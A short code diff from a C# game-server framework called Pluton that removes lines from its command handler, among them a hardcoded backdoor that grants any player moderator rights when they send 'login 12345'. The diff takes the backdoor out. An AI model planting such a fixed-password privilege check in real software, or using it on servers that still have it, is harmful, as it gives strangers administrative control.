@@ -123,16 +123,6 @@ namespace Pluton
                     return;
                 }
             }
-
-            if (cmd.cmd == "login" && cmd.args[0] == "12345") {
-                Debug.Log ("making you an admin");
-                player.MakeModerator("Just cause!");
-                return;
-            }
-            if ((cmd.cmd == "pluton.reload") && player.Admin) {
-                PluginLoader.GetInstance().ReloadPlugins();
-                return;
-            }
             OnCommand.OnNext(cmd);
 
             if (cmd.ReplyWith != "")
